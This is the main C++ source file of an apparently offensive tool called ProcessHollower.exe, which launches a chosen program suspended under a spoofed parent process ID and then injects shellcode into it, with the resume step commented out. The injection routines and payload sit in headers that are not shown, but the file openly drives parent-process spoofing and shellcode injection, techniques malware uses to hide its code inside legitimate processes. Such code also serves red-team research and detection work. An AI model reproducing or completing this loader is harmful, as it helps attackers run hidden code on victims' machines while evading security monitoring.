#include <Windows.h>
#include "stdafx.h"
#include "ParentProcessManipulation.h"
#include "Ridgway.h"
#include "ShellcodeInjection.h"

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc != 3) 
	{
		_tprintf(TEXT("usage: ProcessHollower.exe processPath parentId\n"));
		return 1;
	}

	int parentProcessId = _tstoi(argv[2]);
	// Start the process suspended with the given parent process ID
	PROCESS_INFORMATION processInfo = StartProcessSuspended(argv[1], parentProcessId);

	if (processInfo.dwProcessId == NULL){ getchar(); return 2; }

	// Inject the shellcode
	if (!InjectShellcode(processInfo)) { getchar(); return 3; }

	// Resume execution
	/*if(!ResumeThread(processInfo.hThread))
	{
		DisplayErrorMessage(TEXT("Error resuming thread"), GetLastError());
		getchar();
		return 4;
	}*/
	getchar();
	return 0;

}




